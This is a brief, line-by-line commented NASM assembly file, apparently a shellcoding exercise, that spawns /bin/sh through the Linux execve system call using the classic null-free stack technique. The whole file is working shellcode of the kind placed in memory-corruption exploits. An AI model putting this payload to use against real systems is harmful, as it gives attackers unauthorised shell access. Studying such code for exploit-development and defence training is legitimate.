;execve.nasm
;Author:clubjk
;executes a /bin/sh via the execve syscall)


global _start

section .text

_start:


	xor eax, eax   ;zeroize the eax
	push eax       ;push 0x0 on the stack
	push 0x68732f2f        ;push "hs//" on the stack
	push 0x6e69622f        ;push "nib/" on the stack
	mov ebx, esp           ;move the memory location of the start of stack (esp) to ebx
	push eax       ;push 0x0 on the stack
	mov edx, esp   ;move the memory location of the start of stack (esp) to edx
	push ebx       ;push ebx on the stack
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx
	mov al, 0xb    ;move the execve functional call number (11) to eax
        
	int 0x80       ;invokes the execve system call

